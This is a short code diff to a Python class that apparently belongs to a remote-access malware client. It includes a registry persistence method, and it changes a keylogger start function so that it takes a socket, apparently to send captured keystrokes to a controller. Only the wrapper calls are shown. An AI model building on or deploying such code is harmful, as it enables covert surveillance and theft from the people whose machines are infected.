@@ -25,8 +25,8 @@ class Features:
     def persistence(self, sock):
         add_to_registry(sock=sock)
     
-    def start_keylogger(self):
-        start_keylogger()
+    def start_keylogger(self, sock):
+        start_keylogger(sock=sock)
 
     def stop_keylogger(self):
         stop_keylogger()
